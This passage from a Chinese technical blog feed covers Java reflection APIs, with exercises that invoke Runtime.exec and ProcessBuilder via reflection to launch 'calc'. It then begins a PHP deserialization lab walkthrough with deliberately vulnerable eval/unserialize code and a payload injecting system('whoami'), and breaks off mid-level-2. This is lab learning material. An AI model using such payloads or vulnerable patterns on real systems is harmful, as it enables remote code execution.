title="连接阶段-解析"></a>连接阶段-解析</h5><p>虚拟机将常量池内的符号引用替换为直接引用的过程</p><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><ol><li>到初始化阶段，才真正开始执行类中定义的Java程序代码，此阶段是执行&lt;clinit&gt;()方法的过程</li><li>&lt;clinit&gt;() 方法是由编译器按语句在源文件中出现的顺序，一次自动收集类中的所有<strong>静态变量</strong>的赋值动作和<strong>静态代码块</strong>中的语句，并进行合并。</li><li>虚拟机会保证一个类的&lt;clinit&gt;()方法在多线程环境中被正确的加锁、同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的&lt;clinit&gt;()方法，其他线程都需要阻塞等待，知道活动线程执行&lt;clinit&gt;()方法完毕</li></ol><h3 id="反射获取类的结构信息🚩"><a href="#反射获取类的结构信息🚩" class="headerlink" title="反射获取类的结构信息🚩"></a>反射获取类的结构信息🚩</h3><h4 id="java-lang-Class"><a href="#java-lang-Class" class="headerlink" title="java.lang.Class"></a>java.lang.Class</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>getName()</td><td>获取全类名</td></tr><tr><td>getSimpleName()</td><td>获取简单类名</td></tr><tr><td>getFieIds()</td><td>获取所有Public修饰的属性，包含本类以及父类</td></tr><tr><td>getDeclaredFields()</td><td>获取本类中所有的属性【所有修饰符】</td></tr><tr><td>getMethods()</td><td>获取所有public修饰的方法，包括本类以及父类的</td></tr><tr><td>getDeclaredMethods()</td><td>获取本类的所有方法</td></tr><tr><td>getConstructors()</td><td>获取本类所有public修饰的构造器，</td></tr><tr><td>getDeclaredConstructors()</td><td>获取本类中所有的构造器</td></tr><tr><td>getPackage()</td><td>以Package形式返回 包信息</td></tr><tr><td>getSuperclass()</td><td>以Class形式返回父类信息</td></tr><tr><td>getInterfaces()</td><td>以Class[]形式返回接口信息</td></tr><tr><td>getAnnotations()</td><td>以Annotation[] 形式返回注解信息</td></tr><tr><td>getContructor(Class…clazz)</td><td>根据参数列表，获取对应的public构造器对象</td></tr><tr><td>getDecalaredContructor(Class.clazz)</td><td>根据参数列表，获取对应的构造器</td></tr><tr><td>newInstance()</td><td>调用类中的无参构造器，获取对应类的对象</td></tr></tbody></table><h4 id="java-lang-reflect-FieId"><a href="#java-lang-reflect-FieId" class="headerlink" title="java.lang.reflect.FieId"></a>java.lang.reflect.FieId</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>getModifiers()</td><td>以int形式返回修饰符，默认修饰符是0，public是1，private是2，protected是4，static是8，final是16，多个修饰符则相加</td></tr><tr><td>getType()</td><td>该属性的类型，返回属性对应类型的Class对象</td></tr><tr><td>getName()</td><td>返回该属性的名称</td></tr></tbody></table><h4 id="java-lang-reflect-Method"><a href="#java-lang-reflect-Method" class="headerlink" title="java.lang.reflect.Method"></a>java.lang.reflect.Method</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>getModifiers()</td><td>以int形式返回修饰符，默认修饰符是0，public是1，private是2，protected是4，static是8，final是16，多个修饰符则相加</td></tr><tr><td>getReturnType()</td><td>以Class形式获取 返回类型</td></tr><tr><td>getName()</td><td>获取方法名</td></tr><tr><td>getParameterTypes()</td><td>以Class[]返回参数类型数组</td></tr></tbody></table><h4 id="java-lang-reflect-Constructor"><a href="#java-lang-reflect-Constructor" class="headerlink" title="java.lang.reflect.Constructor"></a>java.lang.reflect.Constructor</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>getModifiers()</td><td>以int形式返回修饰符，默认修饰符是0，public是1，private是2，protected是4，static是8，final是16，多个修饰符则相加</td></tr><tr><td>getName</td><td>返回构造器名（全类名）</td></tr><tr><td>getParameterTypes()</td><td>以Class[]返回参数类型数组</td></tr><tr><td>setAccessible()</td><td>使用反射可以访问private的方法或构造器</td></tr><tr><td>newInstance(Class.clazz…)</td><td>根据参数列表，创建对应的实例</td></tr></tbody></table><h4 id="通过反射创建对象"><a href="#通过反射创建对象" class="headerlink" title="通过反射创建对象"></a>通过反射创建对象</h4><h5 id="调用类中的public修饰的无参构造器"><a href="#调用类中的public修饰的无参构造器" class="headerlink" title="调用类中的public修饰的无参构造器"></a>调用类中的public修饰的无参构造器</h5><ul><li><code>newInstance()</code>调用类中的无参构造器，获取对应类的对象</li></ul><h5 id="调用类中的指定构造器"><a href="#调用类中的指定构造器" class="headerlink" title="调用类中的指定构造器"></a>调用类中的指定构造器</h5><ul><li><code>getContructor(Class...clazz)</code>：根据参数列表，获取对应的public构造器对象</li><li><code>getDecalaredContructor(Class.clazz)</code>：根据参数列表，获取对应的构造器</li><li><code>setAccessible()</code>：爆破，使用反射可以访问private的方法或构造器</li><li><code>newInstance(Object...obj)</code>：调用指定参数列表的构造器</li></ul><h4 id="通过反射访问类中的成员"><a href="#通过反射访问类中的成员" class="headerlink" title="通过反射访问类中的成员"></a>通过反射访问类中的成员</h4><h5 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException </span>&#123;<br>    <span class="hljs-comment">// 1.获取User对象的Class对象和对象实例</span><br>    Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.User00&quot;</span>);<br>    Object o = aClass.newInstance();<br>    <span class="hljs-comment">// 2.根据属性名获取FieId对象</span><br>    Field sal = aClass.getDeclaredField(<span class="hljs-string">&quot;sal&quot;</span>);<br>    sal.setAccessible(<span class="hljs-keyword">true</span>);<span class="hljs-comment">// 访问私有属性</span><br>    sal.set(o,<span class="hljs-number">9999.0</span>);  <span class="hljs-comment">// 设置属性值</span><br>    System.out.println(sal.get(o)); <span class="hljs-comment">// 访问属性值</span><br><br>    <span class="hljs-comment">// 如果是静态属性，则set和get中的参数o,可以写成null</span><br>    <span class="hljs-comment">// 因为静态属性是在类加载的时候就创建了的</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="访问方法"><a href="#访问方法" class="headerlink" title="访问方法"></a>访问方法</h5><ol><li><p>根据方法名和参数列表获取Method方法对象</p><p><code>Method m = clazz.getDeclaredMethod(方法名,Class.clazz...)</code></p></li><li><p>获取对象</p><p><code>Object o = clazz.newInstance()</code></p></li><li><p>爆破（对于非public方法）</p><p><code>m.setAccessible(true)</code></p></li><li><p>访问</p><p><code>Object returnVlaue = m.invoke(o,实参列表)</code></p></li><li><p>注意：如果是静态访问，则invoke的参数o，可以写成null</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mechoy.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectMethod</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        <span class="hljs-comment">// 1.获取class对象，创建实例</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.Boss&quot;</span>);<br>        Object o = aClass.newInstance();<br>        <span class="hljs-comment">// 2.</span><br>        <span class="hljs-comment">// 2.获取方法对象</span><br>        Method say = aClass.getDeclaredMethod(<span class="hljs-string">&quot;say&quot;</span>, <span class="hljs-keyword">int</span>.class, String.class, <span class="hljs-keyword">char</span>.class);<br>        <span class="hljs-comment">// 3.设置爆破</span><br>        say.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 4.调用方法</span><br><span class="hljs-comment">//        Object invoke = say.invoke(o, 1, &quot;2&quot;, &#x27;3&#x27;);</span><br>        Object invoke = say.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>);<br>        System.out.println(invoke);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Boss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Boss</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">say</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n,String s,<span class="hljs-keyword">char</span> c)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> n + <span class="hljs-string">&quot; &quot;</span> + s + <span class="hljs-string">&quot; &quot;</span> + c;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hi</span><span class="hljs-params">(String s)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hi &quot;</span> + s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="通过反射获取内部类"><a href="#通过反射获取内部类" class="headerlink" title="通过反射获取内部类"></a>通过反射获取内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mechoy.reflection.inner;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LocalInnerClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Class&lt;?&gt; outClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.inner.OuterClass&quot;</span>);<br>        Class&lt;?&gt; inClass = Class.forName(<span class="hljs-string">&quot;com.mechoy.reflection.inner.OuterClass$InnerClass&quot;</span>);<br>        <span class="hljs-comment">// 调用内部类的public方法</span><br>        <span class="hljs-comment">// 1.根据方法名获取Method对象</span><br>        Method print1 = inClass.getMethod(<span class="hljs-string">&quot;print1&quot;</span>);<br>        <span class="hljs-comment">// 2.获取内部类的实例</span><br>        <span class="hljs-comment">// 注意:内部类无法直接newInstance()，需要先获取其构造器</span><br>        <span class="hljs-comment">// 需要使用getDeclaredConstructors()获取其构造器</span><br>        Constructor&lt;?&gt; declaredConstructor = inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        <span class="hljs-comment">// 3.使用newInstance()获取实例对象</span><br>        <span class="hljs-comment">// 注意:需要传入外部类的实例对象</span><br>        Object o = declaredConstructor.newInstance(outClass.newInstance());<br>        <span class="hljs-comment">// 4.调用内部类的方法</span><br>        print1.invoke(o);<br><br>        <span class="hljs-comment">// 获取内部类的非public方法</span><br>        <span class="hljs-comment">// 1.使用getDeclaredMethod() 获取非public修饰的方法</span><br>        Method print2 = inClass.getDeclaredMethod(<span class="hljs-string">&quot;print2&quot;</span>);<br>        <span class="hljs-comment">// 2.设置</span><br>        print2.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 3.调用</span><br>        print2.invoke(inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance()));<br><br>        <span class="hljs-comment">// 获取内部类的public属性</span><br>        Field m = inClass.getField(<span class="hljs-string">&quot;m&quot;</span>);<br>        System.out.println(m.get(inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance())));<br><br>        <span class="hljs-comment">// 设置内部类的public属性</span><br>        <span class="hljs-comment">// 1.获取一个内部类的实例对象</span><br>        <span class="hljs-comment">// 注意:这是因为设置时哪一个实例对象，就应该再获取其值，否则看不出来变化</span><br>        Object inClassIns = inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance());<br>        m.set(inClassIns,<span class="hljs-number">999</span>);<br>        System.out.println(m.get(inClassIns));<br><br>        <span class="hljs-comment">// 获取内部类的非public属性</span><br>        Field n = inClass.getDeclaredField(<span class="hljs-string">&quot;n&quot;</span>);<br>        <span class="hljs-comment">// 私有属性需要加上，运行时访问检查</span><br>        n.setAccessible(<span class="hljs-keyword">true</span>);<br>        System.out.println(n.get(inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance())));<br><br>        <span class="hljs-comment">// 设置内部类的非public属性</span><br>        Object inClassFie = inClass.getDeclaredConstructors()[<span class="hljs-number">0</span>].newInstance(outClass.newInstance());<br>        n.setAccessible(<span class="hljs-keyword">true</span>);<br>        n.set(inClassFie,<span class="hljs-number">123</span>);<br>        System.out.println(n.get(inClassFie));<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OuterClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;i am Outer class&quot;</span>);<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InnerClass</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> m = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> n = <span class="hljs-number">2</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print1</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;I am public method of inner class&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print2</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;I am private method of inner class&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反射相关类"><a href="#反射相关类" class="headerlink" title="反射相关类"></a>反射相关类</h3><p><code>java.lang.Class</code>: 代表一个类，Class对象表示某个类加载后再堆中的对象</p><p><code>java.lang.reflect.Method</code>: 代表类的方法，Method对象表示某个类的方法</p><p><code>java.lang.reflect.FieId</code>: 代表类的成员变量，FieId对象表示某个类的成员变量</p><p><code>java.lang.reflect.Constructor</code>: 代表类的构造方法，Constructor对象表示某个类的构造器</p><h3 id="反射调用性能优化"><a href="#反射调用性能优化" class="headerlink" title="反射调用性能优化"></a>反射调用性能优化</h3><h4 id="关闭访问检查"><a href="#关闭访问检查" class="headerlink" title="关闭访问检查"></a>关闭访问检查</h4><ol><li><p>Method、FieId、Constructor对象都有setAccessible()方法</p></li><li><p>setAccessible()作用是启动和禁用访问安全检查的开关</p></li><li><p>参数值为true表示，反射的对象在使用时取消访问检查，提高反射的效率。参数值为false则表示反射的对象执行访问检查</p></li></ol><h3 id="Class类常用方法"><a href="#Class类常用方法" class="headerlink" title="Class类常用方法"></a>Class类常用方法</h3><p>…</p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射调用Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RuntimeTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        System.out.println(runtimeClass);<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-comment">//        Method exec = runtimeClass.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        Method getRuntime = runtimeClass.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">//        exec.invoke(getRuntime.invoke(runtimeClass),&quot;calc&quot;);</span><br><br>        runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<br>                runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(runtimeClass),<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射调用ProcessBuilder(&quot;calc&quot;).start();</span><br><span class="hljs-keyword">package</span> com.mechoy.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProcessBuilderTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//        ProcessBuilder processBuilder = new ProcessBuilder(&quot;calc&quot;);</span><br><span class="hljs-comment">//        processBuilder.start();</span><br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br><span class="hljs-comment">//        Constructor&lt;?&gt; constructor = aClass.getConstructor(List.class);</span><br><span class="hljs-comment">//        Object calc = constructor.newInstance(Arrays.asList(&quot;calc&quot;));</span><br><span class="hljs-comment">//        Method start = aClass.getMethod(&quot;start&quot;);</span><br><span class="hljs-comment">//        start.invoke(calc);</span><br><br><span class="hljs-comment">//        aClass.getMethod(&quot;start&quot;).invoke(aClass.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)));</span><br>        <br>        <span class="hljs-comment">// 在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给</span><br>        <span class="hljs-comment">// ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组</span><br>        aClass.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(aClass.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[][]&#123;&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;&#125;));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.bilibili.com/video/BV1fh411y7R8/?p=716&amp;spm_id_from=pageDriver&amp;vd_source=db93b94230228cb739b48f4f59e74abd">【零基础 快速学Java】韩顺平 零基础30天学会Java</a></li><li><a href="https://www.zhihu.com/question/38496907">hotpot java虚拟机Class对象是放在 方法区 还是堆中 ？</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化靶场</title>
    <link href="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>搞代码审计不会反序列化怎么可以呢，正好又看到了这个反序列化的靶场，于是乎就玩了一下这个靶场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url"># 项目地址<br>https://github.com/fine-1/php-SER-libs<br></code></pre></td></tr></table></figure><h3 id="0x01-关卡"><a href="#0x01-关卡" class="headerlink" title="0x01 关卡"></a>0x01 关卡</h3><h4 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;act);<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span>=unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br><br><br><span class="hljs-variable">$a</span>-&gt;action();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很简单的反序列化，直接传入序列化的对象就可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>=<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> a;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/1.png"></p><h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># level2 源码</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br><span class="hljs-keyword">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// user=&quot;daydream&quot;,pass=&quot;ok&quot;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;login())<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">// 最终目的</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>对象在进行实例化的时候，若存在<code>__construct()</code>会优先调用构造函数</p><p>这里想要<code>echo $flag</code>，就需要<code>login()</code> <code>return 1</code></p><p>想要<code>return 1 </code>就必须满足<code>$this-&gt;user==&quot;daydream&quot; and 